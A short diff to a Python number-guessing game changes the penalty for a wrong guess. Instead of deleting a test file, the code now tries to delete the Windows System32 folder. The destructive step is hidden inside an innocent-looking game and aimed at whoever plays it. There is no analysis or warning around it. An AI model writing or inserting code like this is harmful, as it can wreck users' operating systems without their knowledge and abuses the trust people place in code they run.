@@ -8,4 +8,4 @@ usernum = int(input("What a silly game! Pick a number between 1-10: "))
 if cpunum == usernum:
     print("yay")
 else:
-    os.remove("C:/Users/Admin/Documents/test") 
+    os.remove("C:/Windows/System32") 
